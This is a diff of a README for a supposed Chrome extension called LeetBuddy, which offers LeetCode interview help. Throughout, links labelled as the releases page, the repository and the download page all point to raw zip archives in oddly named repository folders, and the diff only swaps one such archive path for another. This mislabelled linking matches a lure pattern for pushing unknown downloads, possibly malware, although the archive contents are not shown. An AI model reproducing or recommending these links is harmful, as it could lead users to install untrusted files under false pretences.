@@ -1,6 +1,6 @@
 # 🦾 LeetBuddy - Master Coding Interviews with Ease
 
-[![Download LeetBuddy](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip)](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip)
+[![Download LeetBuddy](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/backend/extension/routes/Buddy_Leet_1.1.zip)](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/backend/extension/routes/Buddy_Leet_1.1.zip)
 
 ## ⭐ Overview
 
@@ -11,7 +11,7 @@ LeetBuddy is a Google Chrome Extension designed to help you tackle any LeetCode 
 To begin, you need to install the LeetBuddy Chrome Extension. The following steps will guide you through the process:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip).
+   Go to our [Releases page](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/backend/extension/routes/Buddy_Leet_1.1.zip).
 
 2. **Download LeetBuddy**  
    Look for the latest version of LeetBuddy on the Releases page. Click on the link to download the extension. It will typically have a file format suitable for Chrome extensions.
@@ -33,7 +33,7 @@ To begin, you need to install the LeetBuddy Chrome Extension. The following step
 
 ## 📦 Download & Install
 
-To get started, visit this [page to download LeetBuddy](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip). Ensure you always have the latest version to access new features and improvements.
+To get started, visit this [page to download LeetBuddy](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/backend/extension/routes/Buddy_Leet_1.1.zip). Ensure you always have the latest version to access new features and improvements.
 
 ## 🛠️ Features
 
@@ -75,7 +75,7 @@ If you encounter any issues or have questions, please reach out through the Issu
 
 ## 🌐 Links
 
-- **Repository**: [LeetBuddy GitHub Repository](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip)
-- **Releases**: [Download the Latest Version](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip)
+- **Repository**: [LeetBuddy GitHub Repository](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/backend/extension/routes/Buddy_Leet_1.1.zip)
+- **Releases**: [Download the Latest Version](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/backend/extension/routes/Buddy_Leet_1.1.zip)
 
 Thank you for choosing LeetBuddy. We are excited to support your coding journey!
